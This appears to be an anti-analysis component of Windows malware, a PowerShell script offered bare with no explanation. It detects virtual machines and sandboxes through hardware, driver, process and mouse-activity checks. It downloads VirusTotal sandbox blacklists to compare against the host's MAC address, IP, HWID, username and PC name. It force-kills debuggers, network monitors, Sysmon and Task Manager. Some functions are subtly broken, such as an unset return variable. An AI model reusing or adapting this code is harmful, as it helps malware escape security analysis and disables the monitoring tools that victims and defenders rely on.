function ShowError {
    param([string]$errorName)
    Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show("Sorry, this application cannot run under a Virtual Machine!", $errorName, 'OK', 'Error') | Out-Null
}

function StopBatch {
    taskkill /f /im cmd.exe
}

function Internet-Check {
    try {
        $pingResult = Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop
        if ($pingResult.StatusCode -ne 0) {
            ShowError 'Internet DETECTED !'
            StopBatch
        }
    }
    catch {
        ShowError 'Internet DETECTED !'
        StopBatch
    }
}

function ProcessCountCheck {
    $processes = Get-Process | Measure-Object | Select-Object -ExpandProperty Count
    if ($processes -lt 50) {
        ShowError 'PROCESS COUNT DETECTED !'
        StopBatch
    }
}

function RecentFileActivity {
    $file_Dir = "$ENV:APPDATA/microsoft/windows/recent"
    $file = Get-ChildItem -Path $file_Dir -Recurse
    if ($file.Count -lt 20) {
        ShowError 'RECENT FILE ACTIVITY DETECTED !'
        StopBatch
    }
}

function TestDriveSize {
    $drives = Get-Volume | Where-Object { $_.DriveLetter -ne $null } | Select-Object -ExpandProperty DriveLetter
    $driveSize = 0
    foreach ($drive in $drives) {
        $driveSize += (Get-Volume -DriveLetter $drive).Size
    }
    $driveSize = $driveSize / 1GB
    if ($driveSize -lt 64) {
        ShowError 'DRIVE SIZE DETECTED !'
        StopBatch
    }

}

function CheckForKVM {
    $badDriversList = @("balloon.sys", "netkvm.sys", "vioinput*", "viofs.sys", "vioser.sys")
    $system32Folder = Join-Path -Path $env:SystemRoot -ChildPath "System32"

    foreach ($driver in $badDriversList) {
        if (Get-ChildItem -Path (Join-Path -Path $system32Folder -ChildPath $driver) -ErrorAction SilentlyContinue) {
            ShowError 'KVM DETECTED !'
            StopBatch
        }
    }
}

function ScreenCheck {
    Add-Type @"
using System;
using System.Runtime.InteropServices;
public class User32 {
    [DllImport("user32.dll")]
    public static extern int GetSystemMetrics(int nIndex);
}
"@

    if ([User32]::GetSystemMetrics(0) -lt 800 -or [User32]::GetSystemMetrics(1) -lt 600) {
        ShowError 'SCREEN DETECTED !'
        StopBatch 
    }
}

function VMArtifactsDetect {
    $badFileNames = @("VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys", "vboxogl.dll")
    $badDirs = @("C:\Program Files\VMware", "C:\Program Files\oracle\virtualbox guest additions")

    $file_Dir = Join-Path -Path $env:SystemRoot -ChildPath "System32"
    foreach ($file in Get-ChildItem -Path $file_Dir -ErrorAction Stop) {
        if ($badFileNames -contains $file.Name) {
            ShowError 'VM SYS FILE DETECTED !'
            StopBatch  
        }
    }

    foreach ($dir in $badDirs) {
        if (Test-Path -Path $dir) {
            ShowError 'VM DIR DETECTED !'
            StopBatch  
        }
    }
}

function CheckUptime {
    $uptime = [math]::Round([System.Diagnostics.Stopwatch]::GetTimestamp() / [System.Diagnostics.Stopwatch]::Frequency * 1000 / 1000)
    if ($uptime -lt 1200) {
        ShowError 'UPTIME DETECTED !'
        StopBatch  
    }
}

function GraphicsCardCheck {
    $gpuOutput = wmic path win32_VideoController get name 2>&1

    if ($gpuOutput -match "vmware" -or $gpuOutput -match "virtualbox") {
        ShowError 'GPU DETECTED !'
        StopBatch  
    }
}

function RamCheck {
    $ram = (Get-WmiObject -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB
    if ($ram -lt 2) {
        ShowError 'RAM DETECTED !'
        StopBatch  
    }
}

function MouseCheck {
    $MaxMoveCount = 5

    Add-Type -AssemblyName System.Windows.Forms

    $OldPoint = [System.Windows.Forms.Cursor]::Position
    $MoveCount = 0
    $StartTime = Get-Date

    while ($MoveCount -lt $MaxMoveCount -and ((Get-Date) - $StartTime).TotalSeconds -lt 60) {
        $NewPoint = [System.Windows.Forms.Cursor]::Position
        if ($NewPoint -ne $OldPoint) {
            $OldPoint = $NewPoint
            $MoveCount++
        }
    }

    if ($MoveCount -lt $MaxMoveCount) {
        ShowError 'MOUSE DETECTED !'
        StopBatch  
    }
}

function PluggedIn {
        $usbCheck = reg query "HKLM\SYSTEM\ControlSet001\Enum\USBSTOR" 2>&1

        if ($usbCheck -match "HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Enum\\USBSTOR") {
            ShowError 'USB DETECTED !'
            StopBatch  
        }
}

function Check-ForKnownHypervisor {
    $cpuInfo = Get-WmiObject -Class Win32_Processor
    
    $isHypervisorPresent = $cpuInfo | Where-Object { $_.Description -match "Hypervisor" }

    if ($isHypervisorPresent) {
        ShowError 'Hypervisor DETECTED !'
        StopBatch  
    }
    
    $vendorId = (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer
    
    $vendors = @(
        "KVM",
        "Microsoft",
        "VMware",
        "Xen",
        "Parallels",
        "VirtualBox"
    )
    
    foreach ($vendor in $vendors) {
        if ($vendorId -like "*$vendor*") {
            ShowError 'Hypervisor DETECTED !'
            StopBatch 
        }
    }
}

function Search-Mac {
    $pc_mac = Get-WmiObject win32_networkadapterconfiguration | Where-Object { $_.IpEnabled -Match "True" } | Select-Object -ExpandProperty macaddress
    $pc_macs = $pc_mac -join ","
    return $pc_macs
}

function Search-IP {
    $pc_ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $pc_ip = $pc_ip.Content
    return $pc_ip
}

function Search-HWID {
    $hwid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    return $hwid
}

function Search-Username {
    $pc_username = "$env:username"
    return $pc_username
}

function Search-PC-Name {
    $pc_username = "$env:computername"
    return $pc_name
}

function Invoke-ANTITOTAL {
    $anti_functions = @(
        "Internet-Check",
        "ProcessCountCheck",
        "RecentFileActivity",
        "TestDriveSize",
        "CheckForKVM",
        "ScreenCheck",
        "VMArtifactsDetect",
        "GraphicsCardCheck",
        "RamCheck",
        "MouseCheck",
        "Check-ForKnownHypervisor"
    )

    foreach ($func in $anti_functions) {
        Invoke-Expression "$func"
    }
    $urls = @(
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_username_list.txt",
        "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/pc_name_list.txt"
    )

    $functions = @(
        "Search-Mac",
        "Search-IP",
        "Search-HWID",
        "Search-Username",
        "Search-PC-Name"
    )

    $data = @()
    foreach ($func in $functions) {
        $data += Invoke-Expression "$func"
    }
    foreach ($url in $urls) {
        $blacklist = Invoke-WebRequest -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
        if ($null -ne $blacklist) {
            foreach ($item in $blacklist -split "`n") {
                if ($data -contains $item) {
                    ShowError $item
                    StopBatch  
                }
            }
        }
    }
}

function VMPROTECT {
    $d = wmic diskdrive get model
    if ($d -like "*DADY HARDDISK*" -or $d -like "*QEMU HARDDISK*") {
        ShowError "VM HARDISK DETECTED !"
        StopBatch   
    }

    if ((Get-WmiObject Win32_ComputerSystem).Model -match 'Virtual' -or (Get-WmiObject -Class Win32_ComputerSystem).Manufacturer -match 'Microsoft Corporation' -and (Get-WmiObject -Class Win32_ComputerSystem).Model -match 'Virtual Machine' -or (Get-WmiObject Win32_ComputerSystem).Model -match 'VMware, Inc.' -or (Get-WmiObject Win32_ComputerSystem).Model -match 'VirtualBox') {
        ShowError "VM SYSTEM NAME DETECTED !"
        StopBatch
    }

    $vm_process = @(
        "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", 
        "vm3dservice", "vmacthlp", "vmtoolsd", "vmwareuser", 
        "vt-windows-event-stream", "windbg", "VmRemoteGuest", 
        "Sysmon64", "xenservice"
    )

    $runningVMProcesses = Get-Process | Where-Object { $vm_process -contains $_.Name }
    
    if ($runningVMProcesses) {
        Add-Type -AssemblyName System.Windows.Forms; 
        [System.Windows.Forms.MessageBox]::Show('VM PROCESS DETECTED !', '', 'OK', 'Error')
        StopBatch  
    } else {
        Invoke-ANTITOTAL 
    }

    $debug_process = @(
        'fiddler', 'charles', 'wireshark', 'burp', 'megadumper', 'de4dot', 
        'De4Net', 'De4Net-x86', 'dnspy', 'ilspy', 'cawkvm', 'solarwinds', 
        'paessler', 'cpacket', 'Ethereal', 'sectools', 'riverbed', 'tcpdump', 
        'EtherApe', 'Fiddler', 'telerik', 'glasswire', 'HTTPDebuggerSvc', 
        'HTTPDebuggerUI', 'intercepter', 'snpa', 'dumcap', 'comview', 
        'netcheat', 'cheat', 'winpcap', 'ExtremeDumper', 'extremeDumper', 
        'ExtremeDumper-x86', 'MegaDumper', 'reflector', 'codecracker', 
        'cheatengine', 'x32dbg', 'x64dbg', 'ida -', 'simpleassembly', 
        'peek', 'httpanalyzer', 'httpdebug', 'ProcessHacker', 'autoruns', 
        'autoruns64', 'autorunsc', 'autorunsc64', 'die', 'dumpcap', 'etwdump', 
        'efsdump', 'fakenet', 'filemon', 'hookexplorer', 'httpdebugger', 
        'idaq', 'idaq64', 'immunitydebugger', 'importrec', 'joeboxcontrol', 
        'joeboxserver', 'lordpe', 'ollydbg', 'petools', 'portmon', 
        'proc_analyzer', 'processhacker', 'procexp', 'procexp64', 'procmon', 
        'procmon64', 'pyw', 'qemu-ga', 'taskmgr', 'qga', 'regmon', 'hxd', 
        'resourcehacker', 'sbiesvc', 'sandman', 'scylla_x64', 'sniff_hit', 
        'sysanalyzer', 'sysinspector', 'sysmon', 'tcpview', 'tcpview64', 
        'udpdump', 'proxifier', 'graywolf', 'zed', 'exeinfope', 'titanHide', 
        'titanhide', 'process hacker 2', 'pc-ret', 'http debugger', 'Centos', 
        'process monitor', 'debug', 'ILSpy', 'reverse', 'simpleassemblyexplorer', 
        'process', 'de4dotmodded', 'dojandqwklndoqwd-x86', 'sharpod', 
        'folderchangesview', 'pizza', 'strongod', 'brute', 'dump', 
        'StringDecryptor', 'debugger', 'gdb', 'kdb', 'x64_dbg', 'windbg', 
        'x64netdumper', 'scyllahide', 'reversal', 'ksdumper v1.1 - by equifox', 
        'dbgclr', 'HxD', 'monitor', 'http', 'wpe pro', 'PhantOm', 'kgdb', 
        'james', 'proxy', 'phantom', 'mdbg', 'WPE PRO', 'system explorer', 
        'X64NetDumper', 'protection_id', 'systemexplorer', 'pepper', 'ghidra', 
        'xd', '0harmony', 'dojandqwklndoqwd', 'hacker', 'process hacker', 'SAE', 
        'mdb', 'checker', 'harmony', 'Protection_ID', 'PETools', 'x96dbg', 
        'systemexplorerservice'
    )

    $runningDebugProcesses = Get-Process | Where-Object { $debug_process -contains $_.Name }
    if ($runningDebugProcesses) {
        foreach ($process in $runningDebugProcesses) {
            Stop-Process -Id $process.Id -Force
        }
    }
}
VMPROTECT

